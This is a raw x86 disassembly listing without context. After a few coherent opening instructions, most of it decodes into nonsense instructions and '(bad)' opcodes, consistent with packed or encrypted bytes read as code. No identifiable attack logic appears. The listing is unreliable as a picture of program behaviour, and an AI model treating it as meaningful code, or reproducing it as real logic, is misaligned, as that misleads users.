  4038a3:	mov    eax,DWORD PTR [eax]
  4038a5:	mov    eax,DWORD PTR [eax]
  4038a7:	mov    eax,DWORD PTR [eax]
  4038a9:	call   eax
  4038ab:	mov    eax,DWORD PTR [ebp-0x34]
  4038ae:	mov    ecx,DWORD PTR ds:0x4219ce
  4038b4:	add    DWORD PTR [eax],ecx
  4038b6:	jmp    0x405c6b
  4038bb:	fnstenv [edx-0x73]
  4038be:	xchg   ebp,eax
  4038bf:	gs xchg ebp,eax
  4038c1:	test   eax,0x7c0e640e
  4038c6:	sbb    bl,BYTE PTR [edx-0x357f9e2a]
  4038cc:	pop    edi
  4038cd:	bound  esp,QWORD PTR [edx-0x36]
  4038d0:	pop    edi
  4038d1:	bound  esp,QWORD PTR [edx+0x68]
  4038d4:	xchg   ebp,eax
  4038d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038d6:	sbb    eax,0x7d30f975
  4038db:	aam    0x60
  4038dd:	add    ah,BYTE PTR [edx+0x4b41b226]
  4038e3:	xchg   ecx,eax
  4038e4:	test   eax,0x4c60afa6
  4038e9:	ins    DWORD PTR es:[edi],dx
  4038ea:	xor    DWORD PTR [ecx-0x3d],eax
  4038ed:	push   esi
  4038ee:	and    eax,0x1cdf8dd
  4038f3:	sbb    esi,eax
  4038f5:	mov    ds,WORD PTR [eax-0x315699c4]
  4038fb:	fsubr  QWORD PTR [edi+0x7b]
  4038fe:	pushf  
  4038ff:	fdiv   st(6),st
  403901:	ins    BYTE PTR es:[edi],dx
  403902:	stos   DWORD PTR es:[edi],eax
  403903:	dec    eax
  403904:	push   0x2ab08f1f
  403909:	fldenv [edx-0x267d262]
  40390f:	aaa    
  403910:	push   ds
  403911:	pop    esp
  403912:	inc    edx
  403913:	call   0xbbc49076
  403918:	dec    ecx
  403919:	cld    
  40391a:	xor    DWORD PTR [esi+eax*2],eax
  40391d:	(bad)  [ecx-0x27]
  403920:	sbb    al,0xf3
  403922:	scas   al,BYTE PTR es:[edi]
  403923:	xchg   edi,eax
  403924:	mov    ds:0x14d98be9,al
  403929:	test   eax,0x6ebfb6ab
  40392e:	outs   dx,BYTE PTR ds:[esi]
  40392f:	mov    cl,0x42
  403931:	push   0xaabe50ba
  403936:	sbb    ecx,DWORD PTR [edi]
  403938:	push   0x361fc9ff
  40393d:	mov    edi,0x649ed4f5
  403942:	rol    BYTE PTR [edx+0x7932de06],0xfb
  403949:	sub    dl,bh
  40394b:	loope  0x4038de
  40394d:	jnp    0x403972
  40394f:	dec    esi
  403950:	cmp    al,0x85
  403952:	mov    WORD PTR [ebp+0x38],ss
  403955:	and    ch,BYTE PTR ds:0x98b89e5e
  40395b:	fistp  QWORD PTR ds:0x6888f8bf
  403961:	(bad)  
  403962:	loop   0x4039be
  403964:	pop    edx
  403965:	cwde   
  403966:	push   esi
  403967:	pop    edi
  403968:	mov    DWORD PTR [ebx],eax
  40396a:	cmc    
  40396b:	pop    esp
  40396c:	and    al,0x31
  40396e:	cmp    al,0x96
  403970:	mov    ds:0xa9f39e3e,eax
  403975:	push   esi
  403976:	adc    ebx,DWORD PTR [esi+0x153815c3]
  40397c:	fisttp WORD PTR [edx]
  40397e:	push   ebx
  40397f:	aam    0x7b
  403981:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403982:	add    eax,0x6c8bcbb0
  403987:	(bad)  
  403988:	add    DWORD PTR [edx+ebx*8+0x226925cb],edx
  40398f:	clc    
  403990:	mov    edi,0xe5fdc8d7
  403995:	scas   eax,DWORD PTR es:[edi]
  403996:	js     0x40395d
  403998:	mov    esp,0x9601d0e6
  40399d:	mov    bl,0xcd
  40399f:	aaa    
  4039a0:	scas   al,BYTE PTR es:[edi]
  4039a1:	or     ch,BYTE PTR [edx+0x5d96dad8]
  4039a7:	jne    0x403950
  4039a9:	aas    
  4039aa:	loop   0x40395a
  4039ac:	xlat   BYTE PTR ds:[ebx]
  4039ad:	cli    
  4039ae:	sub    al,0xdd
  4039b0:	push   ebp
  4039b1:	mov    dh,BYTE PTR [ecx*8-0x6d93dcd4]
  4039b8:	daa    
  4039b9:	cli    
  4039ba:	cmp    al,BYTE PTR [edi]
  4039bc:	cmp    edx,DWORD PTR [eax]
  4039be:	pop    ds
  4039bf:	push   0xffffffc2
  4039c1:	mov    bl,0x0
  4039c3:	push   eax
  4039c4:	xor    al,0x6e
  4039c6:	xchg   ebx,eax
  4039c7:	(bad)  [ebp-0x50]
  4039ca:	and    ebp,DWORD PTR [ecx+0x7816167a]
  4039d0:	rcl    BYTE PTR [ecx-0x4f],0x22
  4039d4:	xlat   BYTE PTR ds:[ebx]
  4039d5:	fwait
  4039d6:	pop    es
  4039d7:	dec    ebx
  4039d8:	pop    ebx
  4039d9:	mov    eax,ds:0x13fa6c48
  4039de:	xor    al,0xef
  4039e0:	xor    al,0xb3
  4039e2:	popa   
  4039e3:	je     0x403a4d
  4039e5:	dec    ebx
  4039e6:	je     0x403a5a
  4039e8:	repz jecxz 0x4039c5
  4039eb:	call   0x539:0x2fa13676
  4039f2:	inc    esi
  4039f3:	xchg   esp,eax
  4039f4:	sub    eax,DWORD PTR [ebx+0xe]
  4039f7:	aaa    
  4039f8:	jl     0x4039d7
  4039fa:	jae    0x4039b9
  4039fc:	pop    ebp
  4039fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039fe:	mov    edx,0x7bbdbae1
  403a03:	xor    edi,DWORD PTR [ebx+0x32]
  403a06:	mov    bl,dh
  403a08:	ret    0x88bf
  403a0b:	inc    esp
  403a0c:	into   
  403a0d:	sub    bl,BYTE PTR [edi+eiz*4-0x2a3cadae]
  403a14:	jne    0x4039bf
  403a16:	or     al,0x5d
  403a18:	popa   
  403a19:	sbb    eax,0x79345cf4
  403a1e:	jp     0x403a9a
  403a20:	fimul  DWORD PTR [ebp-0xe5f9104]
  403a26:	push   esp
  403a27:	lock or bh,dl
  403a2a:	int3   
  403a2b:	mov    ds:0x69cd344,al
  403a30:	push   es
  403a31:	inc    eax
  403a32:	ins    DWORD PTR es:[edi],dx
  403a33:	push   es
  403a34:	lods   al,BYTE PTR ds:[esi]
  403a35:	sub    DWORD PTR cs:[esi],esi
  403a38:	mov    ?,WORD PTR [esi+0x69]
  403a3b:	fldenv [edi]
  403a3d:	sub    eax,esp
  403a3f:	test   al,0x83
  403a41:	arpl   WORD PTR [eax-0x13],sp
  403a44:	or     dh,BYTE PTR ss:[eax+0x2de2ae7]
  403a4b:	inc    esp
  403a4c:	jnp    0x403a88
  403a4e:	imul   eax,DWORD PTR [ebx-0x6899a746],0x28d928ec
  403a58:	sub    al,0xb3
  403a5a:	dec    ebp
  403a5b:	adc    DWORD PTR [ebx-0x5d],ebx
  403a5e:	dec    ecx
  403a5f:	mov    al,ds:0x24a01bb7
  403a64:	call   0xc870:0x96d77946
  403a6b:	rol    BYTE PTR [ebx],0x1e
  403a6e:	adc    DWORD PTR [edi+0x3b94afbc],esi
  403a74:	aam    0x3c
  403a76:	mov    eax,DWORD PTR [esi+ecx*1-0x60498913]
  403a7d:	add    BYTE PTR [ebp+0x5f],al
  403a80:	mov    al,0x95
  403a82:	test   BYTE PTR [ebp-0x3b],al
  403a85:	jecxz  0x403ae0
  403a87:	mov    dh,0x51
  403a89:	push   0x76
  403a8b:	addr16 daa 
  403a8d:	sub    edx,edx
  403a8f:	mov    ch,0x4e
  403a91:	in     al,0x5
  403a93:	movlps xmm6,QWORD PTR [esi+0x1]
  403a97:	adc    DWORD PTR [esi-0x10f7e7a1],ecx
  403a9d:	in     al,dx
  403a9e:	mov    edi,0xca285905
  403aa3:	add    BYTE PTR [eax-0x21665f7c],ah
  403aa9:	or     al,0x2b
  403aab:	cmp    ecx,DWORD PTR [edx]
  403aad:	fidivr DWORD PTR [edx]
  403aaf:	aad    0xcd
  403ab1:	dec    ebp
  403ab2:	mov    esi,0xbe69a69b
  403ab7:	xor    al,ah
  403ab9:	gs sub eax,0x400ecb59
  403abf:	dec    ebp
  403ac0:	xchg   ebp,eax
  403ac1:	inc    esi
  403ac2:	int3   
  403ac3:	(bad)  
  403ac4:	std    
  403ac5:	mov    bh,bh
  403ac7:	and    ecx,DWORD PTR [edx]
  403ac9:	jnp    0x403abe
  403acb:	push   cs
  403acc:	mov    eax,0x51653c49
  403ad1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ad2:	dec    ecx
  403ad3:	sub    esi,esi
  403ad5:	sbb    cl,BYTE PTR [ebx+0x13]
  403ad8:	mov    BYTE PTR [esi*1+0x2200fed2],al
  403adf:	nop
  403ae0:	test   BYTE PTR ds:0x584883fc,ah
  403ae6:	mov    esp,0x73185fcd
  403aeb:	(bad)  
  403aec:	inc    ebx
  403aed:	jnp    0x403b67
  403aef:	add    ebp,DWORD PTR [esi-0x7c]
  403af2:	jno    0x403b5e
  403af4:	ins    DWORD PTR es:[edi],dx
  403af5:	(bad)  
  403af6:	adc    al,0xeb
  403af8:	popa   
  403af9:	dec    edx
  403afa:	arpl   WORD PTR [ebx+0xa29b0b7],di
  403b00:	sbb    ecx,ecx
  403b02:	dec    esi
  403b03:	push   ecx
  403b04:	add    al,0x7b
  403b06:	mov    edx,0xc0fce6c4
  403b0b:	jns    0x403b31
  403b0d:	or     eax,0x79333b46
  403b12:	mov    esi,0x793d9fdd
  403b17:	and    DWORD PTR [ecx+0x7ad12368],ebp
  403b1d:	unpckhps xmm3,XMMWORD PTR [edi+0x5528385a]
  403b24:	mov    bh,0x0
  403b26:	in     al,dx
  403b27:	mov    al,ds:0x3a64b655
  403b2c:	pop    es
  403b2d:	xchg   ecx,eax
  403b2e:	adc    esp,DWORD PTR [eax]
  403b30:	mul    ebp
  403b32:	xchg   ebp,eax
  403b33:	in     al,0x98
  403b35:	test   eax,0x77fd8f99
  403b3a:	call   0xd6e9:0xa9b95290
  403b41:	dec    esi
  403b42:	xchg   edi,eax
  403b43:	cld    
  403b44:	pop    ds
  403b45:	xlat   BYTE PTR ds:[ebx]
  403b46:	push   edx
  403b47:	fcom   DWORD PTR [esi+ebp*4-0xd655bd4]
  403b4e:	imul   esp,DWORD PTR [ecx],0x2f
  403b51:	test   eax,0xa70d153d
  403b56:	jg     0x403ae2
  403b58:	das    
  403b59:	sbb    al,0xba
  403b5b:	fisttp QWORD PTR [esi]
  403b5d:	push   ebx
  403b5e:	aaa    
  403b5f:	mov    edx,0x3460e53e
  403b64:	push   ecx
  403b65:	cmp    al,0xb4
  403b67:	adc    bh,ch
  403b69:	cli    
  403b6a:	pusha  
  403b6b:	sub    ebx,ebx
  403b6d:	stos   BYTE PTR es:[edi],al
  403b6e:	loope  0x403b33
  403b70:	dec    ebp
  403b71:	fs in  al,dx
  403b73:	fild   WORD PTR [eax+0x5591c7e9]
  403b79:	jg     0x403b1e
  403b7b:	jbe    0x403bc9
  403b7d:	lock adc edi,DWORD PTR [esi-0x11]
  403b81:	or     ch,BYTE PTR [eax-0x2616f969]
  403b87:	popa   
  403b88:	bnd js 0x403bdb
  403b8b:	mov    dl,0xf5
  403b8d:	dec    ecx
  403b8e:	test   DWORD PTR ds:0xaff6be2b,ebx
  403b94:	mov    ds:0xdbe455aa,al
  403b99:	test   esp,ebp
  403b9b:	cmp    BYTE PTR [ecx+esi*4],0x7c
  403b9f:	sbb    BYTE PTR [edx-0x5d],al
  403ba2:	dec    esp
  403ba3:	xor    eax,0xf2589310
  403ba8:	pop    edx
  403ba9:	jp     0x403b9f
  403bab:	mov    esp,0x8d17c3e7
  403bb0:	out    0x73,al
  403bb2:	imul   ebp,DWORD PTR [ecx+0x36],0xc
  403bb6:	adc    ch,BYTE PTR [edx]
  403bb8:	push   ebx
  403bb9:	dec    esi
  403bba:	fsubp  st(7),st
  403bbc:	(bad)  
  403bbe:	out    0xea,al
  403bc0:	out    0x2c,al
  403bc2:	ror    BYTE PTR [ecx+ebx*4],cl
  403bc5:	out    0x69,eax
  403bc7:	stos   BYTE PTR es:[edi],al
  403bc8:	mov    bl,0x68
  403bca:	pop    ds
  403bcb:	push   eax
  403bcc:	mov    ecx,0xd3cba10f
  403bd1:	inc    ecx
  403bd2:	rcl    BYTE PTR [ebx],1
  403bd4:	inc    edx
  403bd5:	mov    cl,0x21
  403bd7:	rdpmc  
  403bd9:	jmp    0x45c4:0x3f21f3f3
  403be0:	mov    cs,WORD PTR [edi-0x45]
  403be3:	xor    DWORD PTR [edx-0x74523dfc],edi
  403be9:	pop    edi
  403bea:	adc    ah,BYTE PTR [ecx]
  403bec:	fisttp WORD PTR [esp+edx*8]
  403bef:	mov    eax,ds:0x1ae52feb
  403bf4:	int    0x33
  403bf6:	test   BYTE PTR gs:[ebp-0x51],bl
  403bfa:	lds    ebx,FWORD PTR [ebx+0x5c5eb123]
  403c00:	leave  
  403c01:	cmc    
  403c02:	imul   ebx,DWORD PTR [ecx+0x11],0xeffac4e6
  403c09:	sbb    al,BYTE PTR [ebp-0x166ad794]
  403c0f:	mov    bl,BYTE PTR [esi]
  403c11:	(bad)  
  403c12:	lahf   
  403c13:	outs   dx,BYTE PTR ds:[esi]
  403c14:	fld    st(5)
  403c16:	push   edi
  403c17:	cmp    DWORD PTR [esi+ecx*8],esi
  403c1a:	cli    
  403c1b:	out    dx,eax
  403c1c:	pop    esi
  403c1d:	cdq    
  403c1e:	cmp    ch,0x8e
  403c21:	pop    ds
  403c22:	scas   al,BYTE PTR es:[edi]
  403c23:	adc    DWORD PTR [esi+ecx*2],edi
  403c26:	lea    eax,[edi-0x5e]
  403c29:	into   
  403c2a:	inc    eax
  403c2b:	push   0x35
  403c2d:	inc    edx
  403c2e:	iret   
  403c2f:	pop    esi
  403c30:	jae    0x403c4e
  403c32:	xor    dl,ah
  403c34:	imul   ebx,DWORD PTR [esi],0x6d94477f
  403c3a:	jmp    0x95757702
  403c3f:	dec    edi
  403c41:	retf   0xc062
  403c44:	mov    ecx,0x61c1e94c
  403c49:	lahf   
  403c4a:	xchg   DWORD PTR [esi],edx
  403c4c:	cmp    ebp,ebx
  403c4e:	jb     0x403c83
  403c50:	in     al,dx
  403c51:	retf   
  403c52:	jb     0x403cc4
  403c54:	addr16 mov ah,0x1a
  403c57:	mov    BYTE PTR [edi],bl
  403c59:	pop    edi
  403c5a:	mov    ss,WORD PTR [ecx+0x8]
  403c5d:	jne    0x403cdd
  403c5f:	dec    esi
  403c60:	mov    ds:0x96c9ee72,al
  403c65:	jp     0x403cc6
  403c67:	je     0x403ce4
  403c69:	or     eax,0x33db5e7c
  403c6e:	int3   
  403c6f:	mov    ds:0xc515fd9b,al
  403c74:	mov    ah,0x4e
  403c76:	inc    edi
  403c78:	xchg   ecx,eax
  403c79:	xchg   edi,eax
  403c7a:	push   esp
  403c7b:	fnsave [ebp+0x3a]
  403c7e:	(bad)  
  403c80:	outs   dx,DWORD PTR ds:[esi]
  403c81:	mov    dl,0x1b
  403c83:	mov    BYTE PTR [ebx-0x10],ch
  403c86:	bnd jnp 0x403c31
  403c89:	mov    dl,0xf8
  403c8b:	mov    DWORD PTR [ecx+0x3bb6c0a8],eax
  403c91:	dec    eax
  403c92:	xchg   ah,dh
  403c94:	ins    BYTE PTR es:[edi],dx
  403c95:	and    edx,DWORD PTR [esi-0x4b]
  403c98:	push   ebx
  403c99:	test   BYTE PTR [ebx],bl
  403c9b:	in     al,dx
  403c9c:	sahf   
  403c9d:	push   ds
  403c9e:	add    esp,DWORD PTR [ebx-0x2c]
  403ca1:	xor    al,BYTE PTR [esi]
  403ca3:	pop    ecx
  403ca4:	xchg   al,ah
  403ca6:	aaa    
  403ca7:	jecxz  0x403caa
  403ca9:	adc    DWORD PTR [eax+0x12],esp
  403cac:	pop    edi
  403cad:	mov    bl,0xab
  403caf:	cmp    al,0x17
  403cb1:	adc    BYTE PTR [eax+0x43],al
  403cb4:	and    al,0x6e
  403cb6:	test   DWORD PTR [eax],ecx
  403cb8:	and    DWORD PTR [eax-0x2f],esp
  403cbb:	sar    BYTE PTR [esi+0x22e2843d],1
  403cc1:	inc    ebp
  403cc2:	ins    DWORD PTR es:[edi],dx
  403cc3:	jl     0x403cde
  403cc5:	pop    ebx
  403cc6:	xor    eax,0x838c7ba7
  403ccb:	scas   eax,DWORD PTR es:[edi]
  403ccc:	mov    ds:0x72a84d97,eax
  403cd1:	mov    ebp,0xff7fca29
  403cd6:	inc    ecx
  403cd7:	fnstenv [esi+0x144e851f]
  403cdd:	xchg   esp,eax
  403cde:	mov    al,0x43
  403ce0:	addr16 cmc 
  403ce2:	test   ecx,edi
  403ce4:	repz pop esi
  403ce6:	loop   0x403c8e
  403ce8:	idiv   DWORD PTR [edx]
  403cea:	into   
  403ceb:	ror    DWORD PTR [edx+0x73],0x3
  403cef:	inc    edx
  403cf0:	scas   eax,DWORD PTR es:[edi]
  403cf1:	ins    BYTE PTR es:[edi],dx
  403cf2:	je     0x403c9e
  403cf4:	mov    dh,0x40
  403cf6:	pop    eax
  403cf7:	fild   QWORD PTR [ebx]
  403cf9:	ja     0x403cdb
  403cfb:	dec    esp
  403cfc:	stc    
  403cfd:	xor    bh,BYTE PTR [eax-0x62b13c81]
  403d03:	lods   eax,DWORD PTR ds:[esi]
  403d04:	and    DWORD PTR [edx],eax
  403d06:	(bad)  
  403d07:	loopne 0x403d52
  403d09:	ffree  st(3)
  403d0b:	imul   ebx,DWORD PTR [eax],0xe77c077d
  403d11:	mov    al,bl
  403d13:	push   es
  403d14:	jmp    0x26f8cd14
  403d19:	mov    edi,0x7b461f22
  403d1e:	pop    edi
  403d1f:	scas   al,BYTE PTR es:[edi]
  403d20:	jmp    0x154:0x8e84c6be
  403d27:	adc    DWORD PTR [esi],edi
  403d29:	aad    0x0
  403d2b:	sar    BYTE PTR [esi-0x41],cl
  403d2e:	dec    ecx
  403d2f:	sub    BYTE PTR [esi-0x2bf7e36],al
  403d35:	fsub   DWORD PTR [edi+0x29]
  403d38:	and    dh,BYTE PTR [edx+esi*8+0x63]
  403d3c:	ret    
  403d3d:	loope  0x403d83
  403d3f:	xlat   BYTE PTR ds:[ebx]
  403d40:	(bad)  
  403d42:	lds    ecx,FWORD PTR [eax-0x8a7b5ae]
  403d48:	setb   BYTE PTR [ecx+0x78]
  403d4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d4d:	cmc    
  403d4e:	outs   dx,DWORD PTR ds:[esi]
  403d4f:	or     al,0xc2
  403d51:	test   ebp,esp
  403d53:	daa    
  403d54:	add    eax,0x629d8a6
  403d59:	(bad)  
  403d5a:	mov    db4,ebp
  403d5d:	je     0x403d61
  403d5f:	imul   esp,DWORD PTR [edi+0x4c36894a],0x2fe8455e
  403d69:	dec    esp
  403d6a:	fwait
  403d6b:	xor    BYTE PTR [ebx+0x3386ee06],0x4c
  403d72:	std    
  403d73:	pushf  
  403d74:	popa   
  403d75:	ja     0x403d52
  403d77:	(bad)  
  403d78:	dec    esi
  403d79:	mov    bh,0xef
  403d7b:	repnz clc 
  403d7d:	dec    esp
  403d7e:	hlt    
  403d7f:	sbb    DWORD PTR ds:0x95a9254b,ebx
  403d85:	out    0xda,eax
  403d87:	das    
  403d88:	or     eax,0xe693fa70
  403d8d:	cli    
  403d8e:	sbb    al,0xce
  403d90:	imul   esp,esp,0xffffff81
  403d93:	cmp    BYTE PTR [edi-0x4566a520],dh
  403d99:	mov    dl,0x31
  403d9b:	mov    esp,0xfa691959
  403da0:	out    0xe4,eax
  403da2:	or     eax,0xf2d9768e
  403da7:	fisub  WORD PTR [ebx+0x33dfa9d3]
  403dad:	pop    esp
  403dae:	rcr    BYTE PTR [eax+0x4d],1
  403db1:	jl     0x403dad
  403db3:	jl     0x403d88
  403db5:	add    eax,0x91a0b5c2
  403dba:	std    
  403dbb:	arpl   bx,cx
  403dbd:	pop    eax
  403dbe:	sbb    BYTE PTR [eax],cl
  403dc0:	call   0x7ee1e369
  403dc5:	xor    esp,0x6b
  403dc8:	fs jnp 0x403e16
  403dcb:	imul   eax,esi,0x8bef6c2a
  403dd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403dd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403dd3:	test   DWORD PTR [edx+ebp*4-0x44],edi
  403dd7:	cs fs jae 0x403d97
  403ddb:	and    eax,0x6ec4f912
  403de0:	shl    BYTE PTR [esi+0x70],cl
  403de3:	push   ebp
  403de4:	mov    WORD PTR [edx-0x61e5b770],ss
  403dea:	sar    BYTE PTR [edx+0x29a5044],cl
  403df0:	xor    al,0x33
  403df2:	in     al,0xcf
  403df4:	popa   
  403df5:	ret    0x54ab
  403df8:	adc    ecx,DWORD PTR [ecx-0x58]
  403dfb:	dec    ebx
  403dfc:	and    bl,BYTE PTR [esi-0x3c]
  403dff:	mov    dl,BYTE PTR [edx-0x74556f74]
  403e05:	loopne 0x403da0
  403e07:	and    bh,BYTE PTR [eax]
  403e09:	nop
  403e0a:	dec    esi
  403e0b:	es retf 0x5866
  403e0f:	xor    WORD PTR [edi],0x8
  403e13:	lods   al,BYTE PTR ds:[esi]
  403e14:	scas   eax,DWORD PTR es:[edi]
  403e15:	dec    edx
  403e16:	daa    
  403e17:	xchg   ecx,eax
  403e18:	dec    ecx
  403e19:	inc    ebx
  403e1a:	mov    al,ds:0x35bf182c
  403e1f:	test   DWORD PTR [eax],esp
  403e21:	lock mov ebx,0x53feacf4
  403e27:	loope  0x403e64
  403e29:	mov    esp,0x23b48943
  403e2e:	jp     0x403dd5
  403e30:	push   esp
  403e31:	out    0x8d,al
  403e33:	inc    eax
  403e34:	jge    0x403e20
  403e36:	hlt    
  403e37:	pop    eax
  403e38:	jp     0x403df1
  403e3a:	mov    eax,ds:0x92fe8501
  403e3f:	xor    BYTE PTR [eax+esi*8-0x61],0x32
  403e44:	test   eax,0x70e5935c
  403e49:	lds    esi,FWORD PTR [esi-0x26]
  403e4c:	in     eax,dx
  403e4d:	adc    eax,0xb9296f9d
  403e52:	jnp    0x403e10
  403e54:	les    ebx,FWORD PTR [edx+eiz*4-0x18]
  403e58:	push   ss
  403e59:	sub    cl,BYTE PTR [ebx+0x128fabe7]
  403e5f:	jmp    0xdd7ccb5c
  403e64:	add    cl,0x67
  403e67:	or     BYTE PTR [ebp+eiz*2-0x493210f2],0x71
  403e6f:	fstp   TBYTE PTR [ebx]
  403e71:	inc    ecx
  403e72:	(bad)  
  403e73:	xlat   BYTE PTR ds:[ebx]
  403e74:	xchg   edi,eax
  403e75:	mov    edx,0x5cc4e368
  403e7a:	mov    eax,0xd2e8777e
  403e7f:	cmp    ch,BYTE PTR [edi-0x53804602]
  403e85:	xlat   BYTE PTR ds:[ebx]
  403e86:	retf   0xd80d
  403e89:	dec    edx
  403e8a:	lds    eax,FWORD PTR [ebx-0x6e0347b8]
  403e90:	sbb    ebx,ebx
  403e92:	es aam 0xd
  403e95:	outs   dx,BYTE PTR ds:[esi]
  403e96:	push   0x7c9b6d4d
  403e9b:	inc    ecx
  403e9c:	fisub  DWORD PTR [ebp-0x53cc2699]
  403ea2:	xchg   ebp,eax
  403ea3:	sbb    DWORD PTR [esp+eiz*8],edx
  403ea6:	dec    esi
  403ea7:	js     0x403eb4
  403ea9:	or     ecx,esp
  403eab:	push   ebp
  403eac:	retf   
  403ead:	pop    edx
  403eae:	out    dx,al
  403eaf:	int3   
  403eb0:	aam    0x56
  403eb2:	mov    eax,ds:0x3d3e3716
  403eb7:	retf   0xa81e
  403eba:	inc    ebp
  403ebb:	mov    ecx,0x895c3e8f
  403ec0:	fisubr WORD PTR [eax-0x5fb7ca97]
  403ec6:	iret   
  403ec7:	loope  0x403e8b
  403ec9:	dec    edx
  403eca:	push   eax
  403ecb:	cli    
  403ecc:	test   DWORD PTR [ebx-0x1bd36646],esp
  403ed2:	lea    ecx,[edx+0x8]
  403ed5:	xor    al,0xc8
  403ed7:	cmp    ebx,esp
  403ed9:	jp     0x403f59
  403edb:	jns    0x403ee4
  403edd:	push   esp
  403ede:	inc    esp
  403edf:	in     al,0x6b
  403ee1:	push   esi
  403ee2:	pop    ds
  403ee3:	sub    BYTE PTR [ecx],dl
  403ee5:	jge    0x403f1e
  403ee7:	jo     0x403ebf
  403ee9:	cmp    DWORD PTR [edx-0x60],0x61f6f19
  403ef0:	adc    bl,BYTE PTR [esi+0x5412bbba]
  403ef6:	jo     0x403ea4
  403ef8:	bound  esi,QWORD PTR fs:[eax+ebp*2-0x56d82521]
  403f00:	das    
  403f01:	push   ecx
  403f02:	pop    esi
  403f03:	test   DWORD PTR [ebx+0x59],esp
  403f06:	enter  0x454c,0x4a
  403f0a:	or     cl,dl
  403f0c:	push   0x1896cfdb
  403f11:	les    eax,FWORD PTR [esi+ebp*2]
  403f14:	lahf   
  403f15:	loop   0x403f86
  403f17:	add    BYTE PTR [esi+0x28a7be59],0x6f
  403f1e:	push   ds
  403f1f:	popa   
  403f20:	inc    edi
  403f21:	(bad)  
  403f23:	retf   
  403f24:	lds    ebx,FWORD PTR [ebp+0x4bc13598]
  403f2a:	dec    BYTE PTR [ecx]
  403f2c:	cmp    eax,0xf7e1feb2
  403f31:	js     0x403f16
  403f33:	int    0xd0
  403f35:	mov    al,ds:0xda985b54
  403f3a:	cld    
  403f3b:	repnz mov eax,ds:0xae5ebb5f
  403f41:	js     0x403ec5
  403f43:	std    
  403f44:	cld    
  403f45:	jg     0x403f54
  403f47:	imul   esi,DWORD PTR [ecx-0x664237cc],0xffffffa5
  403f4e:	cdq    
  403f4f:	cmp    DWORD PTR [eax+ebp*1+0x17e74ea1],ebx
  403f56:	add    al,0xc4
  403f58:	push   edx
  403f59:	fucomp st(5)
  403f5b:	pop    ebp
  403f5c:	enter  0x6195,0x77
  403f60:	jl     0x403fc0
  403f62:	lock cdq 
  403f64:	mov    cl,0xd4
  403f66:	sub    DWORD PTR [eax-0x7c44744b],esp
  403f6c:	add    al,0x3c
  403f6e:	push   ecx
  403f6f:	dec    ecx
  403f70:	jmp    0x403fc4
  403f72:	outs   dx,BYTE PTR ds:[esi]
  403f73:	jp     0x403f79
  403f75:	sub    DWORD PTR [ecx+0x7e],eax
  403f78:	aas    
  403f79:	aaa    
  403f7a:	clc    
  403f7b:	rcr    ah,cl
  403f7d:	int    0x72
  403f7f:	mov    bp,0x52bc
  403f83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f84:	pop    ebx
  403f85:	not    BYTE PTR [eax+0x323470f0]
  403f8b:	dec    ebp
  403f8c:	lods   eax,DWORD PTR ss:[esi]
  403f8e:	fsubrp st(2),st
  403f90:	pushf  
  403f91:	in     eax,dx
  403f92:	fdivr  st(0),st
  403f94:	cmp    al,0x23
  403f96:	scas   eax,DWORD PTR es:[edi]
  403f97:	(bad)  
  403f98:	pop    ecx
  403f99:	push   es
  403f9a:	out    0x4b,al
  403f9c:	mov    cl,0x64
  403f9e:	push   esp
  403f9f:	pushf  
  403fa0:	ret    0x8941
  403fa3:	or     edx,DWORD PTR [ebx]
  403fa5:	and    al,BYTE PTR [edi-0x71111ffb]
  403fab:	aas    
  403fac:	adc    eax,DWORD PTR [esi-0x5f47ce39]
  403fb2:	test   DWORD PTR [esi],0xd68ef29b
  403fb8:	mov    dh,0xa4
  403fba:	inc    esp
  403fbb:	add    edx,DWORD PTR [eax]
  403fbd:	pop    esp
  403fbe:	outs   dx,DWORD PTR ds:[esi]
  403fbf:	jo     0x403fb6
  403fc1:	out    0x65,al
  403fc3:	ror    DWORD PTR cs:[edi-0x4],1
  403fc7:	jl     0x403fbb
  403fc9:	pop    ebp
  403fca:	push   es
  403fcb:	cdq    
  403fcc:	stc    
  403fcd:	lods   eax,DWORD PTR ds:[esi]
  403fce:	outs   dx,BYTE PTR ds:[esi]
  403fcf:	loopne 0x40400f
  403fd1:	pop    es
  403fd2:	outs   dx,DWORD PTR ds:[esi]
  403fd3:	pop    eax
  403fd4:	mov    cs,WORD PTR ds:0x6c5cad48
  403fda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fdb:	jecxz  0x403f65
  403fdd:	cmp    edi,DWORD PTR [ecx-0x323dbe80]
  403fe3:	(bad)
  403fe6:	ja     0x40405a
  403fe8:	jle    0x404009
  403fea:	enter  0xf3e5,0x5a
  403fee:	data16 cli 
  403ff0:	or     eax,0x118017cd
  403ff5:	ins    DWORD PTR es:[edi],dx
  403ff6:	lock jge 0x403fc0
  403ff9:	sbb    dh,BYTE PTR [esi]
  403ffb:	imul   ebp,DWORD PTR [ecx],0x5f
  403ffe:	loope  0x403f8a
  404000:	cdq    
  404001:	es push esi
  404003:	push   cs
  404004:	int3   
  404005:	adc    al,0x77
  404007:	or     BYTE PTR [ebx-0x43],ah
  40400a:	popa   
  40400b:	mov    cl,0x20
  40400d:	in     al,dx
  40400e:	inc    eax
  40400f:	stos   DWORD PTR es:[edi],eax
  404010:	pop    edi
  404011:	jg     0x403fee
  404013:	sbb    dl,al
  404015:	xchg   ecx,eax
  404016:	jne    0x404038
  404018:	xlat   BYTE PTR ds:[ebx]
  404019:	cmp    edi,DWORD PTR [eax]
  40401b:	mov    edi,0x3d2926fb
  404020:	pop    es
  404021:	add    al,0x49
  404023:	add    al,0x40
  404025:	aaa    
  404026:	cmp    esi,DWORD PTR [edi]
  404028:	jle    0x404028
  40402a:	xchg   esp,eax
  40402b:	inc    esp
  40402c:	nop
  40402d:	mov    WORD PTR [ebx],cs
  40402f:	inc    esp
  404030:	inc    ebp
  404031:	xchg   BYTE PTR [edi+0x70],dl
  404034:	fmul   QWORD PTR [eax-0x7]
  404037:	inc    ecx
  404038:	call   0x211f:0x5e8a8ae7
  40403f:	mov    DWORD PTR [edx+0x32],ebp
  404042:	(bad)  
  404043:	into   
  404044:	cmp    al,0x1
